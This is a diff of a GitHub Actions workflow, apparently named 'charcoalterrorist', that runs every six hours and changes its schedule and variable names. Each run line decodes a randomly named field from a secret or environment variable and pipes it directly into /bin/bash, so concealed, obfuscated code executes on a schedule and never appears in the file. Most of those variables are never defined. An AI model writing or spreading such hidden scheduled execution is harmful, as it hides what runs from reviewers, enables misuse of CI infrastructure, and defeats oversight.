@@ -1,8 +1,9 @@
 name: charcoalterrorist
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
+    - cron: '40 2/6 * * *'
 
 jobs:
   build:
@@ -11,16 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: charcoalterrorist
         env:
-          wdbc72: ${{ secrets.wdbc72 }}
+          or7018: ${{ secrets.or7018 }}
         run: |
-          echo $wdbc72 | jq -r .kfmo123 | /bin/bash
-          echo $bbmvh7409 | jq -r .hnp42661 | /bin/bash
-          echo $mllwk403 | jq -r .mfx593 | /bin/bash
-          echo $jb8114 | jq -r .mtb8 | /bin/bash
-          echo $uvmg1464 | jq -r .z15 | /bin/bash
-          echo $himm2435 | jq -r .ribxm6988 | /bin/bash
-          echo $fshij25 | jq -r .eyle022 | /bin/bash
-          echo $psym524 | jq -r .pvw869 | /bin/bash
-          echo $xneaq4937 | jq -r .qsjug33 | /bin/bash
-          echo $ioc0 | jq -r .jt8 | /bin/bash
+          echo $or7018 | jq -r .rcce01221 | /bin/bash
+          echo $qgew09 | jq -r .h8 | /bin/bash
+          echo $lsl110 | jq -r .zqb839 | /bin/bash
+          echo $uituh998 | jq -r .ikzo44 | /bin/bash
+          echo $goum1872 | jq -r .uyd076 | /bin/bash
+          echo $n4687 | jq -r .qdf17 | /bin/bash
+          echo $vns00332 | jq -r .wwwcb8380 | /bin/bash
 
